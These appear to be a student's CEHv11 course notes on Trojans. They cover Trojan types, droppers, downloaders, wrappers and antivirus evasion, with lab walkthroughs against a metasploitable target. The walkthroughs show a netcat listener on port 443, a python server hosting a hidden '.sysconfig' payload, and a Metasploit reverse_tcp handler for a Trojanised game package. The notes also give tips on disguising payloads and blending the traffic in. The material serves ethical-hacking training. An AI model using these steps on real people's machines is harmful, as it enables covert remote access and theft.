    Filename: eccouncil-ceh31250-v11-7-3-1-trojans.md
    Show Name: CEHv11 (312-50)
    Topic Name: System Hacking Phases and Attack Techniques - Malware Threats
    Episode Name: Trojans ================================================================================

Trojans
Objectives:

    Define what a Trojan is
    Describe the common indicators of a Trojan infection
    Discuss how attackers commonly employ Trojans
    List and define the common types of Trojans used by attackers
    Discuss how to create and deploy a Trojan
    List and define the common channels used by attackers to infect targets with Trojans

    What is a trojan and are there different types?
        Legitimate software with a hidden malicious payload
            RATs
            Mobile Trojans
            IoT/Botnet
            Banking
            DoS/DDoS
            Backdoor
        The purpose of using Trojans
            Control over target host
                Disable firewalls/IDS/etc
                Install more malware
                C2
                Spying on users
                Storage
            Destruction of target host
            DDoS
            Theft
                PII, PHI, Financials,
    What are the methods of deploying trojans?
        Droppers
            Malware that downloads trojan
        Downloaders
            AV safe program that downloads trojan
                Target: Downloads and runs media-player_1.2_installer
                Parrot: serving up .sysconfig and listening with netcat on port 9999
        Wrappers
            Safe program with trojan attached
                When safe program runs, trojan is also executed
                    Made linux trojan binary using Metasploit and freesweep (a minesweep game)
                    Parrot: use exploit/multi/handler ; set payload linux/x64/shell/reverse_tcp
                    Target: sudo dpkg -i /home/billy/Downloads/freesweep.deb
                        Check for shell
        Crypters
            Obfuscations to make trojan FUD
    How do trojans infect targets?
        Email
        Covert Channels
        Proxy Servers
        Removable Media (USB)
    How do trojans evade AV?
        Splitting the file
        Changing file extension (windows hides known extensions by default)
        Modify the trojan and you modify the known signature
        Encryption
        Don't use known trojans
            Custom malware
    How are trojans made?
        Off-the-shelf builder
            DarkHorse Trojan Maker
            ProRAT
            Senna Spy Trojan Generator
        Custom build
=============================================================================================================================================
#Example 1

What's going on?

We have created a piece of malware and we want to use a 'downloader' to get the malicious file over to the target with out getting popped by av

The downloader is named 'media-player_1.2_installer' After the target runs this it will reachout to my server and 'download' the actually malicious file. We named the file '.sysconfig' so that hopefully it wont raise any Eyebrows.

#  $ ls
  media-player_1.2_installer
  .sysconfig
	The 'media-player_1.2_installer' file is the Downloader. If we can get this to the targets computer one way or the other we win.
	- Host a webserver with a website on it that was promoting the Media Player and you intice people to download it and run the installation
	- All the installation does is download our .sysconfig file. Which is the actual Trojan 
	- Then the Trojan will reach out and give me remote access to the Target



	 The downloader is 'media-player_1.2_installer'
- which is downloading the actual nefarious file '.sysconfig'

	The malicious file is '.sysconfig'
- This is reaching out and giving us our backdoor connection. Which is our shell!!


# The Attack...

1. Fire up a listener on the port you configured your exploit for. USE 443! looks like regualar traffic and seldom closed
	$ nc -lnvp 443

# the listener is obviously for catching our shell


2. Now we need to spin up a simple python server to host the exploit so that the victim can access the exploit/ '.sysconifg' file
	# python3 -m http.server 8000
	Or
	# python3 -m SimpleHTTPServer 8000

# This is to make our exploit(.sysconfig) accessable/ downloadable


---------------------------------------------------------------------------------------------------------------------------------
VICTIM Machine

msfadmin@metasploitable:~$ ls

media-player_1.2_installer
#  .sysconfig (this file is hidden. so the only file showing is our 'downloader'

msfadmin@metasploitable:~$./media-player_1.2_installer
msfadmin@metasploitable:~$

	The average user here will just think the file is broken. You get what you pay for, free software sucks etc..
	But if we look at our Python server we should see a 200 successfull request meaning that the target ran the install file
	Which just reached out and downloaded our malicious file (.sysconfig)

# .sysconfig has a payload in it designed to give me a call back. As long as I have a listener ready to catch the incoming call.


That is a 'downloader' session. Pretty straight forward actually.

#NOTE: Droppers and downloaders are close to the same but they are NOT the same.

Dropper already has the payload in it. They are grouped together.

Downloader is seperate from the malicious file. All it does it reach out and download the malicious file as we see in the walk through above.

==============================================================================================================================================


Wrapper Situation! This is where the malicious code and the 'Game' or 'Application' are 'wrapped' into one hence the term wrapper.
So the Application runs and guns as advertised but it has some extras that the victim wouldn't know about... Such as

# Step 1

start msfconsole

┌──(root💀kali)-[/home/kali]
└─# msfconsole
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.1.31-dev                          ]
+ -- --=[ 2201 exploits - 1166 auxiliary - 395 post       ]
+ -- --=[ 596 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try 
globally setting it with setg RHOSTS x.x.x.x

#[*] Starting persistent handler(s)...
msf6 > 

#msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/shell/reverse_tcp
PAYLOAD => linux/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > 

	The payload will be set to whatever payload you used when making your exploit with msfvenom.
	So for this one it looks like he used PAYLOAD => 'linux/x64/shell/reverse_tcp'



#msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/shell/reverse_tcp
PAYLOAD => linux/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set LHOST 10.13.7.111
LHOST => 10.13.7.111
msf6 exploit(multi/handler) > 

	Use port 443 best practice
	Set the LHOST to your local machine 10.13.7.111


# Step 2 
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:443

#NOTE: remember once you see [*] Started reverse TCP handler on 0.0.0.0:443
- STOP pressing buttons! Switch Screens or sit on your hands but touch nothing!

[*] Started reverse TCP handler on 0.0.0.0:443


------------------------------------------------------------------------------
VICTIM

The Target is going to run the installer to his new game.
The install may be wonkie but the game should play like normal. Everything should run
normal. SO the exploit occurrs when the target runs the installation! NOT from the download of the file!
SO the INSTALLER is what executes the wrapper and gives the target the software they want
and it gives us the shell WE WANT! :) 































